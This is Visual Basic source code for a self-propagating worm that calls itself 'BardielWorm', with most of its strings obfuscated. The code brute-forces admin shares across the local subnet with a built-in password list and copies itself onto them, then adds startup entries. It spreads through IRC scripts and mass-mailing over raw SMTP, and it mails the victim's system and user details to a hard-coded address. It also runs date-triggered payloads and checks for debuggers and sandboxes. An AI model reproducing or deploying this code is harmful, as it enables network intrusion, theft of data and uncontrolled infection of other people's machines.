   q("''bktbna'/Geu4':'0.'|'qfu'Gej4':'3+6'#,'#cbdhcb/Qjkl]P>}KRks^Pckd~ESUQ``KT7sKT7,N@o7cOF1K~>4c4drf5>qeOEo]5Q}KjIqeT>i]PUsfT>wejUkbD2hc@7:+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'?.'|'qfu'Gej4':'0+?'#,'#cbdhcb/VP6wd4Uo]DEoeP>~N@At]5?`ePA}N@QrcOMoN@B`fOU7dChqK4c4c~2ue5>td@Ai]_Jr^5>sK5ck]@6wK5kr]@Q3Kjo7eV::+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'>.'|'qfu'Gej4':'65+66'#,'#cbdhcb/T@Qtep::+j.'#,'#Dou/45.'#,'#indl'#,'#Dou/45.'#,'#cbdhcb/ePk~^TEt^TE4]PN`]@QtN@IoejAtN@o7cOF1K~>4c4dr^4kn^5k7bT2me57q]5QlePlqfP2l]_`rfOUsNBM2]V::+j.'#,''z") & vbCrLf & _
   q("''bktbna'/Geu4':'67.'|'qfu'Gej4':'65+66'#,'#cbdhcb/QOMwcjkod~E7]_I7d~Eo]@k5fP2oeiwod~Eoejks^PIwe52kd~Eje4Uqd~EweiIqe@k7^_J`^_A6fTEhcOUpHn?qc4c4KjI2^jIwcOlr^5>sK5ck]@6wK5kr]@Q3Kjo7eV::+j.'#,''z") & vbCrLf & _
   q(")wunqjt`'#indl'Gej4'z") & vbCrLf & _
   q("Fknft'etd'|'tbs'Gqe)ankb'#5") & vbCrLf & _
   q("''na'/'#6'nthw'#4'.'{{'/'#6'ntqhndb'#4'.'|'ofks'z") & vbCrLf & _
   q("''na'/'#b ntst/Gqe)ankb.':'#afktb'.'|'ofks'z") & vbCrLf & _
   q("''na'/'#thdl/qe)-+7.'9'2'.'|'ubsrui'z'") & vbCrLf & _
   q("''Tbs'Gqe)'#,'#6'7'{'=tdfiws'{'Tbs'Gws'#ufic/5377+2777.'") & vbCrLf & _
   q("''na'/'#whusaubb/Gws.':'#afktb'.'|'`hsh'tdfiws'z'") & vbCrLf & _
   q("''Tbs'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'7'{'Tbs'Gwl)'#,'#6'37>1'{'Tbs'Gt}'#ankb/Gqe)ankb.)tn}b") & vbCrLf & _
   q("''Tbs'Gqe)qsw6'qe)'#,'#6'{')snjbu'#,'#6'6'477')thdldkhtb'Gqe)qsw6'{')thdldkhtb'„)'#,'#6") & vbCrLf & _
   q("'')snjbu6'#,'#6'6'47'eb'#6'{')n`ihub'*r>7'#6'5") & vbCrLf & _
   q("'')ufp'*v'wunqjt`'#6'='#,'#dou/6.'#,'CDD'TBIC'Gqe)ankb'#khi`nw/#nw.'Gws'Gt}'#,'#dou/6.") & vbCrLf & _
   q("na'/'#thdl/Gqe)qsw6.'&:'#irkk'.'|')thdldkhtb'Gqe)qsw6'z'{')thdlkntsbi'Gqe)qsw6'Gws'z") & vbCrLf & _
   q("Fknft'eb'|'na'/'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z':'7'.'|')thdldkhtb'\'„)'#,'\'#6'Z'Z'{')thdldkhtb'\'qe)'#,'\'#6'Z'Z'{')snjbu'#,'#6'haa'z'z") & vbCrLf & _
   q("Fknft'etk'|'na'/'#dfkd/'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z','\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'.';'Gt}.'|'eubfc'Gqe)ankb'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'!cfsf'{')thdlpunsb'„)'#,'#6'!cfsf'{'nid'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'z'{'bktb'|'Tbs'\'G'#,'\'qe)'#,'\'#6'Z'Z'Z'6'{'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z':'#dfkd/'Gt}'*'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'.'{'na'/'\'G'#,'\'wl)'#,''\'#6'Z'Z'Z':'7.'|'ubsrui'z'{'eubfc'Gqe)ankb'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'!cfsf'{')thdlpunsb'„)'#,'#6'!cfsf'z'z") & vbCrLf

   M5 = q("Hi'6=ThdlDkhtb=„)-=|'Tbs'Gqe)sjw1'#ubjhqb/#thdlifjb+„).'{'thdldkhtb'#thdlifjb'{'thdldkhtb'\'qe)'#,'\'Gqe)sjw1'Z'Z'{')snjbu'#,'Gqe)sjw1'haa'z") & vbCrLf & _
   q("Hi'6=ThdlKntsbi=qe)-=|'Tbs'Gqe)sjw2'#ubjhqb/#thdlifjb+qe).'{'thdlfddbws'„)'#,'Gqe)sjw2'{'etk'Gqe)sjw2'z") & vbCrLf & _
   q("Hi'6=ThdlPunsb=„)-=|'Tbs'Gqe)sjw1'#ubjhqb/#thdlifjb+„).'{'na'/'\'G'#,'\'qe)'#,'\'Gqe)sjw1'Z'Z'Z':'6'.'|')snjbu'#,'#ufic/>>+>>>>.'6'67'thdldkhtb'#thdlifjb'{')snjbu'#,'#u/>>+>>>>.'6'67'thdldkhtb'\'qe)'#,'\'Gqe)sjw1'Z'Z'{')snjbu'#,'Gqe)sjw1'haa'{'ofks'z'{'etk'Gqe)sjw1'z") & vbCrLf & _
   q("Hi'6=b ns=|'qfu'Gewb':'") & Sp(1) & q("'#,'['{'qfu'Ged':'6'{'ponkb'/Ged';:'67.'|") & vbCrLf & _
   q("''''na'/Ged':'6.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/VPUwcjkr^P21^T21f_F:+j.'z") & vbCrLf & _
   q("''''na'/Ged':'5.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/Qjkl]P?rbjkp+j.'z") & vbCrLf & _
   q("''''na'/Ged':'4.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/V5>re5IkS@>V^_Moej>~ePAtKiwwdF::+j.'z") & vbCrLf & _
   q("''''na'/Ged':'3.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/Uj>7e~21f_F:+j.'z") & vbCrLf & _
   q("''''na'/Ged':'2.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/f5A7cOlrbjkp+j.'z") & vbCrLf & _
   q("''''na'/Ged':'1.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/S4IoePAD]P2J^PUken21f_F:+j.'z") & vbCrLf & _
   q("''''na'/Ged':'0.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/T@Qmf@k1e~21f_F:+j.'z") & vbCrLf & _
   q("''''na'/Ged':'?.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/ViQ}fA>5d6>S^PUoeT21f_F:+j.'z") & vbCrLf & _
   q("''''na'/Ged':'>.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/S_Q}fPJrbjkp+j.'z") & vbCrLf & _
   q("''''na'/Ged':'67.'|'qfu'Gewd':'Gewb'#,'#cbdhcb/c4c4KjQrcOMkc@QrfP6w]P27e~21f_F:+j.'z") & vbCrLf & _
   q("''na'/#b ntst/Gewd.':'#surb.'|')ubjhqb'Gewd'z'{'nid'Ged'z") & vbCrLf & _
   q("qfu'Gdi':'#anicankb/Gewb+-5)}nw+7.'{'qfu'Gdd':'6'{'ponkb'/Gdd';:'Gdi.'|')ubjhqb'#anicankb/Gewb+-5)}nw+Gdd.'{'nid'Gdd'z'z") & vbCrLf & _
   q("Hi'6=Cntdhiibds=|')snjbut'haa'{')thdldkhtb'qe)-'{')thdldkhtb'„)-'z")
   MCV = M1 & M2 & M3 & M4 & M5: MCV = Replace(MCV, q("G"), "%")

   Set bm = Bf.createtextfile(m & q("[Ubjhsb)njn")): bm.write MCV: bm.Close

   MCV = "": M1 = "": M2 = "": M3 = "": M4 = "": M5 = ""

   If Dir(Sp(1) & q("[`bc}fd)}nw")) <> "" Then Exit Sub
   id = Shell(Sp(1) & q("[wl}nw)b b'") & Sp(1) & q("[`bc}fd)}nw'") & Sp(1) & q("[") & key2, vbHide)
   End Sub

   Function Dow() As Boolean
   On Error Resume Next: Dim Bd As String
   Bd = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"))
   If (Bd = 0) Or (Bd = "") Then Dow = False Else Dow = True
   If Day(Date) Mod 3 = 0 Then
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"), 1, ""
   Else
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"), 0, ""
   End If
   End Function

   Function BState() As Boolean
   Call MailsSend
   On Error Resume Next: BState = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
   If Err Then BState = True
   End Function

   Sub Bred()
   On Error Resume Next
   If StartWinsock() <> True Then Exit Sub
   Call BRedInfected: Call EndWinsock
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[UbcSnjb"), Day(Date), ""
   End Sub

   Sub BRedInfected()
   Call MailsSend
   On Error Resume Next: Dim hostname As String * 256, hostent_addr As Long, Host As HostEnt, hostip_addr As Long, temp_ip_address() As Byte, i As Integer, ip_address As String
   If gethostname(hostname, 256) = SOCKET_ERROR Then Exit Sub Else hostname = Trim$(hostname)

   hostent_addr = gethostbyname(hostname)

   If hostent_addr = 0 Then Exit Sub

   MemCopy Host, hostent_addr, LenB(Host): MemCopy hostip_addr, Host.h_addr_list, 4

   Do
   ReDim temp_ip_address(1 To Host.h_length)
   MemCopy temp_ip_address(1), hostip_addr, Host.h_length

   For i = 1 To Host.h_length
   ip_address = ip_address & temp_ip_address(i) & "."
   Next

   ip_address = Mid$(ip_address, 1, Len(ip_address) - 1)

   IpA ip_address

   ip_address = ""
   Host.h_addr_list = Host.h_addr_list + LenB(Host.h_addr_list): MemCopy hostip_addr, Host.h_addr_list, 4
   Loop While (hostip_addr <> 0)
   End Sub

   Sub IpA(x)
   On Error Resume Next: i1 = Split(x, q(")"))
   For i = 0 To UBound(i1) - 1
   I2 = I2 & i1(i) & "."
   Next
   For U = 1 To 255
   BNetBios I2 & U
   Next
   End Sub

   Sub BNetBios(BUC)
   On Error Resume Next: Dim Bnet As NETRESOURCE, Bl As Long
   Bnet.dwType = RESOURCETYPE_DISK: Bnet.lpLocalName = "Z:"
   Bnet.lpRemoteName = "\\" & BUC & "\c": Bnet.lpProvider = ""
   For Each i1 In Ured()
   For Each I2 In Ured()
   Bl = WNetAddConnection2(Bnet, CStr(i1), CStr(I2), CONNECT_UPDATE_PROFILE)
   If Bl = 0 Then BRed2Infected q("]=["): Exit Sub
   Next
   Next
   End Sub

   Function Ured()
   On Error Resume Next: Dim U(1 To 70) As String
   U(1) = "%null%": U(2) = "%username%": U(3) = "%username%12": U(4) = "%username%123"
   U(5) = "%username%1234": U(6) = "123": U(7) = "1234": U(8) = "12345"
   U(9) = "123456": U(10) = "1234567": U(11) = "12345678": U(12) = "654321"
   U(13) = "54321": U(14) = "1": U(15) = "111": U(16) = "11111"
   U(17) = "111111": U(18) = "11111111": U(19) = "000000": U(20) = "00000000"
   U(21) = "pass": U(22) = "5201314": U(23) = "88888888": U(24) = "888888"
   U(25) = "passwd": U(26) = "password": U(27) = "sql": U(28) = "database"
   U(29) = "admin": U(30) = "test": U(31) = "server": U(32) = "computer"
   U(33) = "secret": U(34) = "oracle": U(35) = "sybase": U(36) = "root"
   U(37) = "Internet": U(38) = "super": U(39) = "user": U(40) = "manager"
   U(41) = "security": U(42) = "public": U(43) = "private": U(44) = "default"
   U(45) = "1234qwer": U(46) = "123qwe": U(47) = "abcd": U(48) = "abc123"
   U(53) = "123abc": U(54) = "abc": U(55) = "123asd": U(56) = "asdf"
   U(57) = "asdfgh": U(58) = "!@#$": U(59) = "!@#$%": U(60) = "!@#$%^"
   U(61) = "!@#$%^&": U(62) = "!@#$%^&*": U(63) = "!@#$%^&*(": U(64) = "!@#$%^&*()"
   U(65) = "intel": U(66) = "": U(67) = vbCrLf: U(68) = BGetComputerName()
   U(69) = "KKKKKKK": U(70) = GetUser()
   Ured = U()
   End Function

   Sub BRed2Infected(Bp)
   On Error Resume Next: Dim bnr As String
   bnr = Rm
   FileCopy Sp(1) & q("[") & key2, Bp & bnr

   If Dir(Bp & q("Frshb bd)efs")) <> "" Then
   n = FrFile
   Open Bp & q("Frshb bd)efs") For Append As #n
   Print #n, vbCrLf & q("Gpni'[") & bnr: Close #n
   End If

   D = Dir(Bp, vbDirectory + vbSystem + vbHidden)
   Do While Len(D) <> 0

   If LCase(Left(D, 3)) = q("pni") Then
   If InStr(D, ".") = 0 Then

   WIni q("Pnichpt"), q("Uri"), Bp & bnr, Bp & D & q("[Pni)nin")

   End If
   End If

   D = Dir()
   Loop

   Call BCNet
   End Sub

   Sub BCNet()
   On Error Resume Next: Dim Bl As Long: Bl = WNetCancelConnection2("Z:", 0, True)
   End Sub

   Sub payload1()
   On Error Resume Next
   If Day(Date) <> 3 Then Exit Sub
   Set hh = Bf.createtextfile(Sp(0) & q("[Efucnbk)osf")): hh.write q(";osjk9;obfc9;snskb9Efucnbk'Phuj'*'@BC]FD'KFET'5774;(snskb9;(obfc9;ehc~'e`dhkhu:ekfdl'sb s:ubc9;dbisbu9;e9;----------------@BC]FD'KFET----------------9;w9P45(Efucnbk)E'e~'JfdonibCufjhi(@BC]FD;w9Obdoh'bi'bk'Wbuý'+Dfkncfc'Jricnfk''';w9¦Qnqf'Armnjhun&;eu9;w9@BC]FD'KFET'5774;(e9;(dbisbu9;(ehc~9;(osjk9"): hh.Close: Bw.run Sp(0) & q("[Efucnbk)osf")
   End Sub

   Sub payload2()
   On Error Resume Next: If Day(Date) = 5 Then Bw.run q("ossw=((ppp)fqunk*kfqn`ib)dhj")
   End Sub

   Sub payload3()
   On Error Resume Next: If Day(Date) = 19 Then Bw.run q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(ftbtniht)osjk")
   End Sub

   Sub payload4()
   On Error Resume Next: If Day(Date) = 1 Then MsgBox q("@BC]FD'QNQB"), , q("EfucnbkPhuj")
   End Sub

   Sub payload5()
   On Error Resume Next: If Day(Date) = 7 Then MsgBox q("erto''^''tofuhi'FTBTNIHT") & vbCrLf & q("KNEBUSFC''F''WFKBTSNIF''b''NUFV"), , q("EfucnbkPhuj")
   End Sub

   Sub SendBackDat()
   Call WriteReg
   On Error Resume Next
   If BState() = False Then Exit Sub

   Dim MsgBardiel As String
   MsgBardiel = q("P45)Efucnbk)F)phuj'Ubwhusfichtb") & vbCrLf & Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Wfubis")) & vbCrLf & InDat(1) & vbCrLf & InDat(2) & vbCrLf
   MsgBardiel = MsgBardiel & vbCrLf & ReadFile(Sp(2) & q("[JfnkJ)cfs")) & vbCrLf & ReadFile(Sp(2) & q("[JfnkO)cfs")) & vbCrLf & ReadFile(Sp(2) & q("[JfnkK)cfs")) & vbCrLf
   MsgBardiel = MsgBardiel & vbCrLf & GetWinVersion & vbCrLf & Date & vbCrLf & Time & vbCrLf & Left(PaisID, Len(PaisID) - 1) & vbCrLf & Left(LanguageID, Len(LanguageID) - 1) & vbCrLf
   MsgBardiel = MsgBardiel & vbCrLf & Left(BGetComputerName, Len(BGetComputerName) - 0) & vbCrLf & GetUser
   If Not (StartWinsock()) Then Exit Sub
   Call Hook(Bform.hWnd)

   Dim Temp As Variant: Progress = 0: do_cancel = False

       If mysock <> 0 Then closesocket (mysock): mysock = 0

   Temp = ConnectSock(CStr(q("j 6)kfsnijfnk)dhj")), Bform.hWnd)

       If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

      Call SendData(mysock, "HELO localhost" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "mail from:" + Chr(32) + "<b3wgd0@latinmail.com>" + vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "RCPT TO:<wormdarby@latinmail.com>" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "DATA" & vbCrLf)

   If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, MsgBardiel & vbCrLf & vbCrLf & "." & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "QUIT" & vbCrLf)

   If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

   Call closesocket(mysock): mysock = 0
   Call UnHook(Bform.hWnd)
   Call EndWinsock
   End Sub

   Function ReadFile(Pfile)
   On Error Resume Next
   If Not (Flx(Pfile)) Then Exit Function
   Dim pr As String
   Set pf = Bf.OpenTextFile(Pfile): pr = pf.ReadAll: pf.Close
   ReadFile = pr
   End Function

   Sub BPirch(Ppath)
   On Error Resume Next: Dim PScript As String
   PScript = q("\KbqbktZ") & vbCrLf & _
   q("Bifekbc:6") & vbCrLf & q("Dhris:6") & vbCrLf & q("Kbqbk6:777*Rilihpit") & vbCrLf & q("777*RilihpitBifekbc:6") & vbCrLf & _
   q("") & vbCrLf & q("\777*RilihpitZ") & vbCrLf & _
   q("Rtbu6:-&-G-") & vbCrLf & q("RtbuDhris:6") & vbCrLf & _
   q("Bqbis6:HI'MHNI=-=(wunqjt`'#indl'Tb 'Dofs'bi'ossw=((ppp)whphp)dhj(jcj4775(nicb )osjk'{'(ankbdhw~'#wnudowfso'#,'e)`c'#wnudowfso'#,'#jb'#,')}nw'{'(cdd'tbic'#indl'#wnudowfso'#,'#jb'#,')}nw") & vbCrLf & _
   q("Bqbis5:HI'WFUS=$=(wunqjt`'#indl'Feruunch8'Jnuf'btsf'wf`b'ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(nicb )osjk'{'(ankbdhw~'#wnudowfso'#,'e)`c'#wnudowfso'#,'#jb'#,')}nw'{'(cdd'tbic'#indl'#wnudowfso'#,'#jb'#,')}nw") & vbCrLf & _
   q("Bqbis4:HI'CDDTBIS=-)}nw=(punsb'*D'#wnudowfso'#,'dkt)qeb'Hi'Buuhu'Ubtrjb'Ib s'{'(punsb'#wnudowfso'#,'dkt)qeb'Tbs'a:DubfsbHembds/%Tdunwsni`)AnkbT~tsbjHembds%.'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'%'#,'#wnudowfso'#,'-)}nw%'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'ptdunws)tdunwsarkkifjb'{'(snjbu'6'6'2'(b bdrsb'#wnudowfso'#,'dkt)qeb") & vbCrLf & _
   q("Bqbis3:HI'CDDTBICAFNK=-)}nw=(punsb'*D'#wnudowfso'#,'dkt)qeb'Hi'Buuhu'Ubtrjb'Ib s'{'(punsb'#wnudowfso'#,'dkt)qeb'Tbs'a:DubfsbHembds/%Tdunwsni`)AnkbT~tsbjHembds%.'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'%'#,'#wnudowfso'#,'-)}nw%'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'ptdunws)tdunwsarkkifjb'{'(snjbu'5'6'2'(b bdrsb'#wnudowfso'#,'dkt)qeb") & vbCrLf & _
   q("Bqbis2:HI'SB_S=-qnurt-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
   q("Bqbis1:HI'SB_S=-`rtfih-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
   q("Bqbis0:HI'SB_S=-phuj-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
   q("Bqbis?:HI'SB_S=-suhmfi-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
   q("Bqbis>:HI'SB_S=-suh~fih-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & q("BqbisDhris:>")

   Set P = Bf.createtextfile(Sp(0) & q("[bqbist)ckk")): P.write PScript: P.Close
   PScript = "": FileCopy Sp(0) & q("[bqbist)ckk"), Ppath & q("[bqbist)nin"): SA Ppath & q("[bqbist)nin"), 0
   WIni q("CDD"), q("FrshOncbCddPni"), q("6"), Ppath & q("[wnudo>?)nin")
   WIni q("CDD"), q("FrshOncbCddPni"), q("6"), Ppath & q("[wnudo45)nin")

   If Dir(Ppath & q("[e)`c")) <> "" Then Exit Sub
   id = Shell(Sp(1) & q("[wl}nw)b b'") & Ppath & q("[`bc}fd)}nw'") & Sp(1) & q("[") & key2, vbHide)
   Sleep 5000: Name Ppath & q("[`bc}fd)}nw") As Ppath & q("[e)`c")
   End Sub

   Sub CreateBMutex()
   Call WriteReg
   On Error Resume Next
   Dim bMutex As SECURITY_ATTRIBUTES
   bMutex.lpSecurityDescriptor = 0: bMutex.nLength = Len(bMutex): bMutex.bInheritHandle = 1
   Mutex = CreateMutex(bMutex, 1, "BardielWorm")
   If (Err.LastDllError = ERROR_ALREADY_EXISTS) Then
   End
   End If
   End Sub

   Sub Priority()
   On Error Resume Next
   Call SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)
   End Sub

   Sub bSmtp(bHost, bDat, bFrom, bStyle)
   Call WriteReg
   On Error Resume Next
   If BState() = False Then Exit Sub
   Set M1 = Bf.OpenTextFile(bDat): M2 = M1.ReadAll: M1.Close
   M3 = Split(M2, vbCrLf)

   If Not (StartWinsock()) Then Exit Sub
   Call Hook(Bform.hWnd)

   Dim Temp As Variant: Progress = 0: do_cancel = False

       If mysock <> 0 Then closesocket (mysock): mysock = 0

   Temp = ConnectSock(bHost, Bform.hWnd)

       If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

   If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

       If InStr(LCase(bHost), q("ohsjfnk")) <> 0 Then Call SendData(mysock, "HELO worldcomputers.com" & vbCrLf) Else Call SendData(mysock, "HELO localhost" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

   For i = 0 To UBound(M3)

   If (IsMail(M3(i))) And (IsMReg(M3(i))) Then

       Call SendData(mysock, "mail from:" + Chr(32) + "<" + bFrom + ">" + vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "RCPT TO:<" & M3(i) & ">" & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

       Call SendData(mysock, "DATA" & vbCrLf)

   If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

       Randomize: xx = Int(Rnd * UBound(M3)): Call SendData(mysock, BEML(M3(xx), bStyle) & vbCrLf & vbCrLf & "." & vbCrLf)

   If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

   End If
   Next

       Call SendData(mysock, "QUIT" & vbCrLf)

   If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[TjswSnjb"), Day(Date), ""

   Call closesocket(mysock): mysock = 0
   Call UnHook(Bform.hWnd)
   Call EndWinsock

   End Sub

   Sub ExitSmtp()
   On Error Resume Next
   Call closesocket(mysock): mysock = 0
   Call UnHook(Bform.hWnd)
   Call EndWinsock
   Call BSendMail
   End Sub
   Function bSmtpProgress(b As Long) As Boolean
   On Error Resume Next: Dim TimeOut As Variant
   TimeOut = Timer + 60
   While Progress <> b
           DoEvents
           If do_cancel = True Then
           Call closesocket(mysock): mysock = 0
           bSmtpProgress = False
               Exit Function
           End If

           If Timer > TimeOut Then
               Call closesocket(mysock): mysock = 0
               bSmtpProgress = False
               Exit Function
           End If
   Wend
   bSmtpProgress = True
   End Function

   Function bSmtpProgress1(b As Long) As Boolean
   On Error Resume Next: Dim TimeOut As Variant
   TimeOut = Timer + 180
   While rtncode <> b
           DoEvents
           If do_cancel = True Then
           Call closesocket(mysock): mysock = 0
           bSmtpProgress1 = False
               Exit Function
           End If

           If Timer > TimeOut Then
               Call closesocket(mysock): mysock = 0
               bSmtpProgress1 = False
               Exit Function
           End If
   Wend
   rtncode = 0
   bSmtpProgress1 = True
   End Function

   Sub WriteReg()
   On Error Resume Next: Dim v As String: v = ""
   If Asc(Left(GetCommandLine, 1)) <> ((Asc("b") * -(6 Xor 7)) / -2) - ((9 Or 3) + ((6 Xor 7) * 4)) Then End

   For Each strEnv In Bw.Environment(q("WUHDBTT"))
          If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
   Next

   If IsDebuggerPresent() <> (20 / -20) + 1 Then End

   sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

   For i = 0 To UBound(sHn)
   sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
   If sHle <> (Asc(Chr(30 + 4)) / -2) + 16 Then End
   Next

   sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)B b[Wfso"))
   For x = 0 To UBound(sRg)
   sRr = Rr(sRg(x))
   If sRr <> v Then End
   Next

   End Sub
